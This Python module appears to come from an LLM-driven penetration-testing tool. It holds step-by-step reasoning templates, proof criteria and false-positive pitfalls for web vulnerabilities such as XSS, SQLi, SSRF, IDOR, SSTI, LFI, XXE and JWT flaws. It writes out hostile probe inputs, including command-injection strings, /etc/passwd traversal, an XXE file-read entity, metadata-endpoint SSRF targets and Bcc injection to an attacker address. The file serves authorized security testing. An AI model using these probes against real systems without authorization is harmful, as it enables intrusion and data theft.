"""
Structured Chain-of-Thought reasoning templates per vulnerability type.

These templates teach the LLM HOW to reason through vulnerability testing
by providing structured thinking frameworks. They don't tell the AI what
to find — they tell it how to THINK.

Each template defines:
1. Reasoning chain: Step-by-step thinking process
2. Decision criteria: When to confirm vs reject
3. Proof requirements: What constitutes valid evidence
4. Common pitfalls: Typical false positive patterns
"""

import logging
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)


# ── Reasoning Template Structure ──────────────────────────────

REASONING_TEMPLATES: Dict[str, Dict] = {
    # ── Injection Vulnerabilities ──────────────────────────────

    "xss": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY REFLECTION: Find where user input appears in response HTML",
            "STEP 2 - DETERMINE CONTEXT: Is reflection in HTML body, attribute, JavaScript, URL, or CSS?",
            "STEP 3 - TEST ENCODING: Send <, >, \", ', &, / and check which are encoded/filtered",
            "STEP 4 - CHOOSE PAYLOAD: Select context-appropriate payload that survives filters",
            "STEP 5 - VERIFY EXECUTION: Confirm script actually runs (not just present in source)",
            "STEP 6 - PROVE IMPACT: Demonstrate cookie theft, DOM manipulation, or event trigger"
        ],
        "decision_criteria": {
            "confirmed": "Script executes in browser context (Playwright/headless verification)",
            "likely": "Payload reflected unencoded in executable context, but no browser test",
            "rejected": "All special chars encoded, CSP blocks execution, or payload in comment/non-exec context"
        },
        "proof_requirements": [
            "Payload must be in executable HTML/JS context (NOT in comment, NOT in text node that's escaped)",
            "Browser execution is the gold standard (Playwright alert/DOM/cookie check)",
            "If no browser test: show the exact HTML context where payload lands unencoded"
        ],
        "common_pitfalls": [
            "Payload in HTML comment <!-- --> is NOT executable",
            "Payload URL-encoded in href is NOT XSS unless javascript: protocol",
            "CSP header blocks inline scripts even if payload reflects perfectly",
            "JSON response with Content-Type: application/json is NOT XSS",
            "Reflected in HTTP header is NOT XSS (it's header injection)"
        ]
    },

    "xss_stored": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY STORAGE: Find forms/inputs that store data (comments, profiles, messages)",
            "STEP 2 - SUBMIT PAYLOAD: Insert XSS payload via the storage mechanism",
            "STEP 3 - FIND DISPLAY: Navigate to where stored data is rendered to OTHER users",
            "STEP 4 - VERIFY PERSISTENCE: Confirm payload survives storage and retrieval",
            "STEP 5 - CHECK CONTEXT: Verify payload is in executable context on display page",
            "STEP 6 - BROWSER TEST: Use Playwright to confirm script execution on display page"
        ],
        "decision_criteria": {
            "confirmed": "Payload stored, retrieved, and executes when page viewed by another user",
            "likely": "Payload stored and rendered unencoded, but no cross-user browser test",
            "rejected": "Payload sanitized on storage, encoded on display, or not rendered to other users"
        },
        "proof_requirements": [
            "TWO requests needed: one to STORE, one to DISPLAY/VERIFY",
            "Display page must be accessible to OTHER users (not just the submitter)",
            "Browser execution on the display page is required for full confirmation"
        ],
        "common_pitfalls": [
            "Input stored but HTML-encoded on display = NOT stored XSS",
            "Payload visible only to submitter = self-XSS (lower severity)",
            "Preview/echo of submitted data is reflected XSS, NOT stored XSS"
        ]
    },

    "sqli": {
        "reasoning_chain": [
            "STEP 1 - DETECT INJECTION: Test with single quote ('), double quote (\"), and sleep-based payloads",
            "STEP 2 - IDENTIFY DATABASE: MySQL (@@version), PostgreSQL (version()), MSSQL (@@VERSION), Oracle (v$version)",
            "STEP 3 - DETERMINE TYPE: Error-based, UNION-based, blind boolean, blind time-based, or out-of-band",
            "STEP 4 - EXTRACT DATA: Use appropriate technique to retrieve database information",
            "STEP 5 - PROVE DATA: Show extracted data is real DB content (not just error messages)",
            "STEP 6 - ASSESS SCOPE: Can we read other tables? Other databases? File system?"
        ],
        "decision_criteria": {
            "confirmed": "Actual data extracted from database (table names, user data, version string)",
            "likely": "Database error message with our injected syntax visible, but no data extraction yet",
            "rejected": "WAF error page, application error (not DB error), or same error for any input"
        },
        "proof_requirements": [
            "Error-based: DB error message must contain injected SQL fragment",
            "UNION: Extracted data must be verifiable DB content (not static strings)",
            "Blind: Time difference must be >3 seconds AND consistent AND not caused by payload length",
            "Boolean: Two distinct responses that correlate with true/false conditions"
        ],
        "common_pitfalls": [
            "WAF blocking page is NOT a SQL error - check if ANY special char triggers it",
            "Application validation error ('invalid input') is NOT SQL injection",
            "Slow response might be network latency, not time-based SQLi - test with sleep(0) baseline",
            "JSON syntax error != SQL error - many APIs return 400 for malformed input"
        ]
    },

    "ssrf": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY FETCH: Find parameters that cause server to make HTTP requests (url=, href=, src=, callback=)",
            "STEP 2 - TEST EXTERNAL: Confirm server fetches our controlled URL (use Burp Collaborator/webhook.site)",
            "STEP 3 - TEST INTERNAL: Attempt to reach internal services (127.0.0.1, 169.254.169.254, 10.x.x.x)",
            "STEP 4 - VERIFY CONTENT: Check if response contains INTERNAL service data (not just a status code diff)",
            "STEP 5 - BYPASS FILTERS: Try DNS rebinding, URL encoding, redirect chains, IPv6, alternative representations",
            "STEP 6 - PROVE IMPACT: Extract cloud metadata, access internal APIs, or scan internal network"
        ],
        "decision_criteria": {
            "confirmed": "Response contains data from internal service (metadata, internal API response, internal HTML)",
            "likely": "Server makes outbound request to our controlled domain (confirmed via DNS/HTTP callback)",
            "rejected": "Status code change only (without content proof), or server blocks all internal requests"
        },
        "proof_requirements": [
            "CRITICAL: Status code change alone is NEVER sufficient for SSRF",
            "Must show content from internal service (AWS metadata, internal page HTML, etc.)",
            "Or must show outbound request to attacker-controlled server (DNS/HTTP callback)",
            "Negative control: verify the URL parameter actually triggers server-side fetching"
        ],
        "common_pitfalls": [
            "Status 403→200 change can be application routing, NOT SSRF",
            "Same response body with different status code = NOT SSRF",
            "Application might validate URL format but still block internal IPs",
            "Redirect from external to internal might be blocked by follow-redirect settings"
        ]
    },

    "idor": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY OBJECTS: Find endpoints with user-specific object IDs (/api/users/42, /orders/123)",
            "STEP 2 - TEST ACCESS: Change the ID to another user's ID while keeping your auth token",
            "STEP 3 - COMPARE DATA: Is the response DATA different from your own? (not just HTTP status)",
            "STEP 4 - VERIFY OWNERSHIP: Confirm the returned data belongs to ANOTHER user (different name/email/etc)",
            "STEP 5 - TEST OPERATIONS: Can you modify/delete other users' objects? (PUT/DELETE with other IDs)",
            "STEP 6 - PROVE IMPACT: Show specific PII or sensitive data from another user's account"
        ],
        "decision_criteria": {
            "confirmed": "Retrieved/modified another user's specific data (different name, email, profile info)",
            "likely": "Different response for different IDs, but can't verify data ownership",
            "rejected": "Server ignores ID (returns your own data), or returns 403/404 for other IDs"
        },
        "proof_requirements": [
            "MUST compare DATA CONTENT between your ID and other ID",
            "Different response ≠ IDOR. Must show DATA belongs to DIFFERENT user",
            "If server returns 200 for all IDs but same data = NOT IDOR (server ignores parameter)",
            "Best proof: show two responses with different user-identifying fields (name, email)"
        ],
        "common_pitfalls": [
            "API returns 200 for all IDs but always returns YOUR profile = NOT IDOR",
            "Public data endpoints (e.g., public profiles) are not IDOR",
            "UUID/GUID IDs make enumeration impractical (mention this in report)",
            "Sequential scan returning empty objects for non-existent IDs = NOT IDOR"
        ]
    },

    "command_injection": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY EXECUTION: Find parameters passed to OS commands (ping, nslookup, file operations)",
            "STEP 2 - TEST OPERATORS: Try ;, |, ||, &&, `, $(), newline after the parameter value",
            "STEP 3 - CONFIRM EXECUTION: Use time-based detection (;sleep 5;) or output-based (;id;)",
            "STEP 4 - READ OUTPUT: Check if command output appears in response",
            "STEP 5 - ESCALATE: Try reading /etc/passwd, environment variables, or reverse shell",
            "STEP 6 - PROVE: Show OS command output that could not come from application logic"
        ],
        "decision_criteria": {
            "confirmed": "OS command output visible in response (uid=, /etc/passwd content, env vars)",
            "likely": "Consistent time delay with sleep commands (>3 sec diff from baseline)",
            "rejected": "No output, no time delay, or application error instead of command execution"
        },
        "proof_requirements": [
            "Output must be from OS command (not application-generated)",
            "Time-based: sleep(N) must produce exactly N seconds delay, and sleep(0) must NOT",
            "OOB: DNS/HTTP callback from target server confirms execution"
        ],
        "common_pitfalls": [
            "Application timeout ≠ sleep-based command injection",
            "Error message containing command text ≠ command execution",
            "Blacklisted characters might block some operators but not others - try all"
        ]
    },

    "ssti": {
        "reasoning_chain": [
            "STEP 1 - DETECT TEMPLATE: Inject {{7*7}} or ${7*7} or #{7*7} and check for '49' in response",
            "STEP 2 - IDENTIFY ENGINE: Jinja2 ({{config}}), Twig ({{_self.env}}), Freemarker, Velocity, Pug, EJS",
            "STEP 3 - CONFIRM ENGINE: Use engine-specific syntax to verify (e.g., {{config.items()}} for Jinja2)",
            "STEP 4 - ESCALATE TO RCE: Use engine-specific payload chain to achieve code execution",
            "STEP 5 - EXECUTE COMMAND: Run OS command through template engine",
            "STEP 6 - PROVE RCE: Show OS command output (id, whoami, hostname)"
        ],
        "decision_criteria": {
            "confirmed": "Arithmetic evaluated (7*7=49) AND code execution achieved",
            "likely": "Arithmetic evaluated but RCE not yet achieved (sandbox or restrictions)",
            "rejected": "Template syntax returned literally (no evaluation), or math done client-side"
        },
        "proof_requirements": [
            "49 must appear where {{7*7}} was injected (not elsewhere in page)",
            "For RCE: OS command output must be shown in response",
            "Distinguish from client-side template (Angular, Vue) which is NOT SSTI"
        ],
        "common_pitfalls": [
            "Client-side template engines (Angular {{7*7}}) evaluate in browser = NOT SSTI",
            "Calculator feature that evaluates math is NOT SSTI",
            "Some WAFs block {{ but allow {%...%} or other syntax variations"
        ]
    },

    "lfi": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY INCLUDES: Find parameters loading files (page=, file=, template=, include=)",
            "STEP 2 - TEST TRAVERSAL: Try ../../../etc/passwd or ....//....//etc/passwd",
            "STEP 3 - VERIFY FILE CONTENT: Response must contain actual file content (root:x:0:0: for /etc/passwd)",
            "STEP 4 - BYPASS FILTERS: Try null bytes (%00), double encoding, PHP wrappers (php://filter)",
            "STEP 5 - READ SENSITIVE FILES: Application config, .env, database.php, web.config",
            "STEP 6 - ESCALATE: Try log poisoning, /proc/self/environ, PHP wrappers for RCE"
        ],
        "decision_criteria": {
            "confirmed": "Actual file content returned (recognizable /etc/passwd format, config values, source code)",
            "likely": "Error message reveals file system path but no content read",
            "rejected": "Application returns 404/error, or path is resolved without traversal"
        },
        "proof_requirements": [
            "File content must be recognizable (not just different response length)",
            "/etc/passwd: must see root:x:0:0 format lines",
            "Source code: must see actual code syntax (<?php, import, function def)",
            "Config: must see key=value pairs or structured config data"
        ],
        "common_pitfalls": [
            "404 page with path in error != file read",
            "WAF blocking ../ is not proof of vulnerability (just proof of WAF)",
            "Relative path resolution to application files might be intended behavior"
        ]
    },

    "xxe": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY XML: Find endpoints accepting XML (Content-Type: text/xml, SOAP, RSS, SVG upload)",
            "STEP 2 - TEST ENTITY: Inject <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><foo>&xxe;</foo>",
            "STEP 3 - CHECK RESPONSE: Does entity value appear in response? (file content or error with path)",
            "STEP 4 - READ FILES: Try /etc/passwd, application config files",
            "STEP 5 - TEST OOB: If no direct output, try out-of-band (XXE to external DTD with data exfil)",
            "STEP 6 - PROVE: Show file content extracted via XML entity expansion"
        ],
        "decision_criteria": {
            "confirmed": "File content extracted via entity (hostname, /etc/passwd content visible)",
            "likely": "XML parser error reveals file path or entity processing",
            "rejected": "XML rejected, entities disabled, or no entity processing observed"
        },
        "proof_requirements": [
            "Entity must resolve to actual file content (not just be parsed)",
            "OOB: DNS/HTTP callback with data confirms blind XXE",
            "Error-based: XML error must show file content in error message"
        ],
        "common_pitfalls": [
            "Modern XML parsers disable external entities by default",
            "JSON endpoints with XML Content-Type might not parse XML at all",
            "SVG/DOCX XXE requires file upload, not direct injection"
        ]
    },

    "csrf": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY STATE-CHANGING: Find forms/requests that modify data (password change, email update, transfer)",
            "STEP 2 - CHECK TOKENS: Does the form have a CSRF token? Is it validated server-side?",
            "STEP 3 - TEST WITHOUT TOKEN: Remove CSRF token from request - does it still succeed?",
            "STEP 4 - TEST CROSS-ORIGIN: Can the request be triggered from a different domain?",
            "STEP 5 - CHECK HEADERS: Is Origin/Referer validated? SameSite cookie attribute?",
            "STEP 6 - BUILD POC: Create HTML page on attacker domain that submits the form automatically"
        ],
        "decision_criteria": {
            "confirmed": "State-changing action succeeds without CSRF token from cross-origin context",
            "likely": "No CSRF token present but cross-origin test not performed",
            "rejected": "CSRF token required and validated, or SameSite=Strict cookies block cross-origin"
        },
        "proof_requirements": [
            "Must demonstrate the ACTION succeeds (not just that request goes through)",
            "Cross-origin context required (different domain, not same-site)",
            "Show the state change actually occurred (password changed, email updated)"
        ],
        "common_pitfalls": [
            "GET requests with no state change are NOT CSRF",
            "SameSite=Lax cookies block cross-site POST (modern browsers)",
            "API endpoints with Bearer token auth are NOT vulnerable to CSRF"
        ]
    },

    "open_redirect": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY REDIRECTS: Find parameters controlling redirects (redirect=, url=, next=, return=, goto=)",
            "STEP 2 - TEST EXTERNAL: Set redirect to https://evil.com - does browser redirect there?",
            "STEP 3 - CHECK LOCATION: Verify Location header contains attacker URL (not just 302 status)",
            "STEP 4 - BYPASS FILTERS: Try //evil.com, /\\evil.com, evil.com%23@trusted.com",
            "STEP 5 - VERIFY NAVIGATION: Browser must actually navigate to attacker's domain",
            "STEP 6 - ASSESS IMPACT: Can be chained with OAuth for token theft"
        ],
        "decision_criteria": {
            "confirmed": "Location header points to attacker-controlled external domain",
            "likely": "Redirect to external domain but with some restrictions (only specific paths)",
            "rejected": "Server validates redirect target, only allows same-domain redirects"
        },
        "proof_requirements": [
            "Location header in 3xx response must contain attacker URL",
            "Must redirect to EXTERNAL domain (internal redirects are usually by design)",
            "Meta refresh or JavaScript redirect counts if no header-based redirect"
        ],
        "common_pitfalls": [
            "Redirect to same domain is usually intended functionality",
            "Login redirect to /dashboard after auth is NOT open redirect",
            "Some apps return 200 with redirect URL in body but don't actually redirect"
        ]
    },

    "nosql_injection": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY NOSQL: Find JSON/BSON endpoints likely using MongoDB, CouchDB, etc.",
            "STEP 2 - TEST OPERATORS: Inject {\"$gt\": \"\"}, {\"$ne\": null}, {\"$regex\": \".*\"}",
            "STEP 3 - OBSERVE BEHAVIOR: Does query operator change the results returned?",
            "STEP 4 - EXTRACT DATA: Use $regex for character-by-character data extraction",
            "STEP 5 - COMPARE RESPONSES: $gt:'' should return more results than exact match",
            "STEP 6 - PROVE: Show data extraction that bypasses intended query logic"
        ],
        "decision_criteria": {
            "confirmed": "Query operators accepted and change results (e.g., $ne:null returns all records)",
            "likely": "Different response with operator injection but data not yet extracted",
            "rejected": "Operators treated as literal strings, or input validated before query"
        },
        "proof_requirements": [
            "Must show the operator changes query behavior (not just different response)",
            "Best: extract data that shouldn't be accessible (other users' records)",
            "Boolean: {\"$gt\":\"\"} returns different count than exact match"
        ],
        "common_pitfalls": [
            "JSON parse error ≠ NoSQL injection (just malformed JSON)",
            "MongoDB driver sanitization might prevent operator injection",
            "Content-Type must be application/json for JSON body injection"
        ]
    },

    # ── Access Control ─────────────────────────────────────────

    "bola": {
        "reasoning_chain": [
            "STEP 1 - MAP OBJECTS: Identify all endpoints with object IDs in URL/params",
            "STEP 2 - DETERMINE OWNERSHIP: Which objects belong to which users?",
            "STEP 3 - CROSS-ACCESS: Use User A's token to access User B's objects",
            "STEP 4 - COMPARE DATA: Response data must belong to User B (different from User A's data)",
            "STEP 5 - TEST OPERATIONS: Try CRUD operations on other users' objects",
            "STEP 6 - PROVE: Show specific data fields that identify the object as belonging to another user"
        ],
        "decision_criteria": {
            "confirmed": "Accessed another user's specific object with data proving different ownership",
            "likely": "Different response for different IDs but can't verify ownership",
            "rejected": "Access denied, same data returned (server ignores ID), or public data"
        },
        "proof_requirements": [
            "DATA COMPARISON is mandatory - show fields that differ between users",
            "200 status alone is NOT proof - must compare content",
            "If only one user available: compare known user data vs accessed data"
        ],
        "common_pitfalls": [
            "API returning your own data for any ID = NOT BOLA",
            "Public endpoints (GET /products/1) are not access control violations",
            "Rate limiting or ID format validation ≠ access control"
        ]
    },

    "bfla": {
        "reasoning_chain": [
            "STEP 1 - MAP FUNCTIONS: Identify admin/privileged endpoints and regular user endpoints",
            "STEP 2 - TEST PRIVILEGE: Access admin endpoint with regular user token",
            "STEP 3 - COMPARE RESPONSES: Does regular user get admin functionality?",
            "STEP 4 - VERIFY EXECUTION: Did the admin action actually execute? (not just 200 status)",
            "STEP 5 - CHECK BOTH DIRECTIONS: Test user→admin AND admin→other-admin roles",
            "STEP 6 - PROVE: Show admin action result that shouldn't be available to regular user"
        ],
        "decision_criteria": {
            "confirmed": "Regular user successfully executed admin function with verifiable result",
            "likely": "Admin endpoint returns 200 to regular user but can't verify action executed",
            "rejected": "403/401 returned, or 200 but action didn't actually execute"
        },
        "proof_requirements": [
            "MUST verify the privileged action was actually executed (not just status 200)",
            "Compare response DATA between admin and regular user",
            "Show the state change caused by the unauthorized action"
        ],
        "common_pitfalls": [
            "200 status with empty body or error message = NOT BFLA",
            "Generic error page returning 200 = NOT BFLA",
            "Documentation endpoints accessible to all users are usually intended"
        ]
    },

    "privilege_escalation": {
        "reasoning_chain": [
            "STEP 1 - MAP ROLES: Identify different user roles (user, admin, moderator, etc.)",
            "STEP 2 - FIND ROLE PARAMETER: Look for role/permission fields in registration, profile update, JWT",
            "STEP 3 - MODIFY ROLE: Try changing role parameter (role=admin, isAdmin=true, permission=*)",
            "STEP 4 - VERIFY ESCALATION: Does the user now have elevated privileges?",
            "STEP 5 - TEST ACCESS: Try accessing admin endpoints with escalated role",
            "STEP 6 - PROVE: Show admin functionality accessible after role modification"
        ],
        "decision_criteria": {
            "confirmed": "User gained elevated privileges and accessed admin-only functionality",
            "likely": "Role parameter accepted but can't verify privilege change",
            "rejected": "Role parameter ignored or overridden server-side"
        },
        "proof_requirements": [
            "Must show BEFORE and AFTER comparison of user capabilities",
            "Admin endpoint access after escalation proves the issue",
            "JWT role claim change must result in actual access change"
        ],
        "common_pitfalls": [
            "Role in JWT not validated server-side = important to test",
            "Frontend hiding admin UI ≠ backend enforcing access control",
            "Self-assigned role that's ignored by backend = NOT privilege escalation"
        ]
    },

    # ── Infrastructure ─────────────────────────────────────────

    "cors_misconfiguration": {
        "reasoning_chain": [
            "STEP 1 - TEST ORIGIN: Send Origin: https://evil.com header, check Access-Control-Allow-Origin",
            "STEP 2 - CHECK CREDENTIALS: Is Access-Control-Allow-Credentials: true returned?",
            "STEP 3 - TEST REFLECTION: Does ACAO reflect any origin, or specific patterns?",
            "STEP 4 - TEST NULL: Does Origin: null get allowed? (used in sandboxed iframes)",
            "STEP 5 - VERIFY IMPACT: Can cross-origin JS read authenticated response data?",
            "STEP 6 - PROVE: Show a cross-origin page that reads authenticated data from the target"
        ],
        "decision_criteria": {
            "confirmed": "ACAO reflects attacker origin WITH Allow-Credentials:true on authenticated endpoint",
            "likely": "ACAO reflects arbitrary origin but no credentials header",
            "rejected": "ACAO is fixed value or null, or no credentials allowed"
        },
        "proof_requirements": [
            "Both ACAO: attacker-origin AND Allow-Credentials: true needed for high severity",
            "Must be on endpoint that returns sensitive data when authenticated",
            "ACAO: * with Allow-Credentials is actually blocked by browsers (spec violation)"
        ],
        "common_pitfalls": [
            "ACAO: * alone is low severity (no cookies sent)",
            "CORS on public API without auth is usually intended",
            "Preflight (OPTIONS) CORS headers don't mean data is accessible"
        ]
    },

    "jwt_vulnerabilities": {
        "reasoning_chain": [
            "STEP 1 - DECODE JWT: Base64 decode header and payload, identify algorithm",
            "STEP 2 - TEST NONE ALGORITHM: Set alg=none, remove signature",
            "STEP 3 - TEST ALGORITHM CONFUSION: If RS256, try changing to HS256 with public key as secret",
            "STEP 4 - TEST WEAK SECRET: Try common secrets (secret, password, key123) with HS256",
            "STEP 5 - MODIFY CLAIMS: Change user ID, role, or expiration in payload",
            "STEP 6 - PROVE: Show modified JWT accepted by server with elevated access"
        ],
        "decision_criteria": {
            "confirmed": "Modified JWT (different user/role) accepted and returns different user's data",
            "likely": "None algorithm accepted (200 response) but can't verify claim changes take effect",
            "rejected": "Server validates signature properly, rejects modified tokens"
        },
        "proof_requirements": [
            "Modified JWT must result in DIFFERENT server behavior (not just 200)",
            "For none alg: must show server processes claims from unsigned token",
            "For weak secret: must show signed token with modified claims is accepted"
        ],
        "common_pitfalls": [
            "JWT expiration error ≠ JWT vulnerability",
            "Refreshed JWT with same claims ≠ algorithm bypass",
            "Some servers accept expired tokens for non-critical endpoints (by design)"
        ]
    },

    "race_condition": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY TARGETS: Find operations where timing matters (transfers, redemptions, votes, signups)",
            "STEP 2 - PREPARE REQUESTS: Craft identical requests for the racy operation",
            "STEP 3 - SEND SIMULTANEOUSLY: Send N requests in parallel (within same TCP connection if possible)",
            "STEP 4 - CHECK RESULTS: Did the operation execute more times than allowed?",
            "STEP 5 - VERIFY STATE: Check account balance, coupon usage count, vote count",
            "STEP 6 - PROVE: Show the state inconsistency (balance changed by 2x, coupon used twice)"
        ],
        "decision_criteria": {
            "confirmed": "Operation executed more times than should be possible (state inconsistency verified)",
            "likely": "Multiple 200 responses for single-use operation, but can't verify state",
            "rejected": "Server properly serializes requests, only first succeeds"
        },
        "proof_requirements": [
            "Must show STATE CHANGE that shouldn't happen (balance, count, etc.)",
            "Multiple success responses alone are not sufficient (might be idempotent)",
            "Before/after comparison of affected resource is required"
        ],
        "common_pitfalls": [
            "Multiple 200 responses might be idempotent (same result, no double execution)",
            "Network jitter might prevent true concurrent arrival",
            "Some race conditions only trigger under specific server load"
        ]
    },

    "deserialization": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY SERIALIZED DATA: Find base64, Java serialized (rO0AB, aced0005), pickle, JSON with class hints",
            "STEP 2 - DECODE FORMAT: Determine serialization format (Java, PHP, Python pickle, .NET)",
            "STEP 3 - CRAFT PAYLOAD: Generate deserialization gadget chain for the target framework",
            "STEP 4 - INJECT PAYLOAD: Replace serialized data with malicious payload",
            "STEP 5 - CHECK EXECUTION: Look for command output, DNS callback, or time delay",
            "STEP 6 - PROVE: Show command execution via deserialization (ysoserial, pickle.loads, etc.)"
        ],
        "decision_criteria": {
            "confirmed": "Gadget chain executed, OS command output or OOB callback received",
            "likely": "Deserialization error reveals class loading (potential gadget chain exists)",
            "rejected": "Input not deserialized, or no gadget chains available in classpath"
        },
        "proof_requirements": [
            "Must show code execution or OOB callback from deserialization",
            "Class loading errors with attacker-specified class names indicate processing",
            "For Java: ysoserial-generated payload accepted AND triggers action"
        ],
        "common_pitfalls": [
            "Base64 data ≠ serialized object (might be just encoded text)",
            "Custom serialization format might not have known gadget chains",
            "WAF might block known gadget chain signatures"
        ]
    },

    # ── Advanced Injection ─────────────────────────────────────

    "ldap_injection": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY LDAP: Find login forms, directory search, user lookup endpoints",
            "STEP 2 - TEST METACHARACTERS: Inject *, (, ), \\, NUL byte in parameters",
            "STEP 3 - TEST ALWAYS-TRUE: Try *)(&, *)(|(&, )(cn=*) to bypass filters",
            "STEP 4 - OBSERVE CHANGES: Does wildcard return more users than exact match?",
            "STEP 5 - EXTRACT DATA: Enumerate users/attributes via boolean conditions",
            "STEP 6 - PROVE: Show directory data extraction or authentication bypass"
        ],
        "decision_criteria": {
            "confirmed": "LDAP query manipulated: wildcard returns extra records or auth bypassed with injection",
            "likely": "Different response count with LDAP metacharacters vs normal input",
            "rejected": "Input sanitized, LDAP errors not triggered, same response for all"
        },
        "proof_requirements": [
            "Must show query manipulation changes returned data (not just error)",
            "Auth bypass: login succeeded with injected payload, not valid creds",
            "Data extraction: show records returned that shouldn't be accessible"
        ],
        "common_pitfalls": [
            "LDAP error page ≠ LDAP injection (just malformed query)",
            "Application might use parameterized LDAP queries (safe)",
            "Wildcard in search field might be intended functionality"
        ]
    },

    "xpath_injection": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY XML QUERIES: Find parameters querying XML data (search, filter, lookup)",
            "STEP 2 - TEST OPERATORS: Inject ' or 1=1 or '', ] | //* | [, boolean conditions",
            "STEP 3 - TEST ALWAYS-TRUE: ' or '1'='1 should return all records",
            "STEP 4 - EXTRACT NODES: Use //* or position() to enumerate XML structure",
            "STEP 5 - COMPARE COUNTS: True condition returns more results than false",
            "STEP 6 - PROVE: Show XML data extraction beyond intended scope"
        ],
        "decision_criteria": {
            "confirmed": "XPath query manipulated to extract XML data outside intended scope",
            "likely": "Boolean conditions change response (true vs false), but no data extracted",
            "rejected": "Input sanitized, XML errors not exploitable, no behavioral difference"
        },
        "proof_requirements": [
            "True condition (1=1) must return different results than false condition (1=2)",
            "Extracted data must come from XML backend (not just error messages)",
            "Show specific XML nodes or attributes retrieved"
        ],
        "common_pitfalls": [
            "XML parse error ≠ XPath injection",
            "Numeric parameter changes might be normal filtering",
            "Some XPath implementations limit accessible nodes"
        ]
    },

    "graphql_injection": {
        "reasoning_chain": [
            "STEP 1 - FIND GRAPHQL: Detect /graphql, /gql, /query endpoints",
            "STEP 2 - TEST INTROSPECTION: Send __schema query to map types and fields",
            "STEP 3 - MAP MUTATIONS: Find state-changing mutations (create, update, delete)",
            "STEP 4 - TEST AUTH: Can you access queries/mutations meant for other roles?",
            "STEP 5 - TEST INJECTION: Inject SQL/NoSQL in GraphQL arguments",
            "STEP 6 - PROVE: Show unauthorized data access or injection through GraphQL"
        ],
        "decision_criteria": {
            "confirmed": "Accessed unauthorized data or injected through GraphQL arguments",
            "likely": "Introspection reveals sensitive types but can't access them yet",
            "rejected": "All queries properly authorized, introspection disabled, input validated"
        },
        "proof_requirements": [
            "Show specific data retrieved that user shouldn't have access to",
            "Introspection alone is low severity - must show impact beyond schema discovery",
            "For injection: prove the GraphQL argument reaches backend query unsanitized"
        ],
        "common_pitfalls": [
            "GraphQL introspection alone is informational, not critical",
            "Aliases for DoS != injection vulnerability",
            "Public queries returning public data is not a vulnerability"
        ]
    },

    "crlf_injection": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY HEADER REFLECTION: Find params reflected in HTTP response headers",
            "STEP 2 - INJECT CRLF: Send %0d%0a (\\r\\n) in parameter value",
            "STEP 3 - CHECK HEADERS: Does injected CRLF create a new response header?",
            "STEP 4 - TEST XSS VIA HEADERS: Inject CRLF + Content-Type: text/html + body",
            "STEP 5 - TEST SESSION FIXATION: Inject Set-Cookie header via CRLF",
            "STEP 6 - PROVE: Show custom header injection or response splitting"
        ],
        "decision_criteria": {
            "confirmed": "Injected CRLF creates new header visible in response (Set-Cookie, Location, etc.)",
            "likely": "CRLF characters not filtered but can't verify header creation",
            "rejected": "CRLF encoded/stripped, header not split, modern framework prevents it"
        },
        "proof_requirements": [
            "Must show actual new header line in HTTP response (not just URL parameter)",
            "Response must contain attacker-controlled header after CRLF",
            "For response splitting: show two separate HTTP responses"
        ],
        "common_pitfalls": [
            "URL-encoded CRLF in URL bar doesn't mean server processes it",
            "Most modern frameworks strip CRLF from header values automatically",
            "CRLF in response body is NOT CRLF injection"
        ]
    },

    "header_injection": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY REFLECTION: Find input reflected in HTTP response headers",
            "STEP 2 - TEST HOST HEADER: Send modified Host header, check response Location/links",
            "STEP 3 - TEST X-FORWARDED: Inject X-Forwarded-Host, X-Forwarded-For, X-Original-URL",
            "STEP 4 - CHECK IMPACT: Does injected header affect password reset links, cache, routing?",
            "STEP 5 - TEST CACHE POISONING: Can poisoned header be cached and served to others?",
            "STEP 6 - PROVE: Show password reset poisoning, cache poisoning, or routing bypass"
        ],
        "decision_criteria": {
            "confirmed": "Injected header value appears in password reset link, cached response, or routing decision",
            "likely": "Header value reflected but impact not demonstrated",
            "rejected": "Headers validated, ignored, or not reflected in any meaningful context"
        },
        "proof_requirements": [
            "For Host header injection: show poisoned URL in password reset email/link",
            "For cache poisoning: show cached response with injected content",
            "For routing bypass: show access to restricted endpoint via X-Original-URL"
        ],
        "common_pitfalls": [
            "Different server response for different Host value = routing, not necessarily injection",
            "X-Forwarded-For accepted for logging ≠ security vulnerability",
            "Must distinguish between header processing and header injection impact"
        ]
    },

    "email_injection": {
        "reasoning_chain": [
            "STEP 1 - FIND EMAIL FORMS: Locate contact forms, invite, share, password reset forms",
            "STEP 2 - TEST HEADER INJECTION: Inject \\r\\nBcc: attacker@evil.com in email fields",
            "STEP 3 - TEST CC/BCC: Add Cc: or Bcc: headers via newline injection",
            "STEP 4 - TEST BODY MANIPULATION: Inject email body content or attachments",
            "STEP 5 - VERIFY DELIVERY: Check if injected recipients receive the email",
            "STEP 6 - PROVE: Show email sent to unintended recipients via injection"
        ],
        "decision_criteria": {
            "confirmed": "Email received by injected Bcc/Cc address, or email content manipulated",
            "likely": "Newlines not stripped in email fields but delivery not confirmed",
            "rejected": "Input sanitized, headers not injectable, email sending fails"
        },
        "proof_requirements": [
            "Best proof: received email at attacker-controlled address via injection",
            "Alternative: server response confirms email sent with injected headers",
            "Must show injection in SMTP headers, not just form field acceptance"
        ],
        "common_pitfalls": [
            "Form accepting special characters ≠ email injection (backend may sanitize)",
            "Modern email libraries parameterize headers (safe by default)",
            "SMTP relay restrictions may prevent delivery even if headers injected"
        ]
    },

    "expression_language_injection": {
        "reasoning_chain": [
            "STEP 1 - IDENTIFY EL: Find Java EE apps using JSP/JSF (${...} or #{...} syntax)",
            "STEP 2 - TEST EVALUATION: Inject ${7*7} or #{7*7}, look for '49' in response",
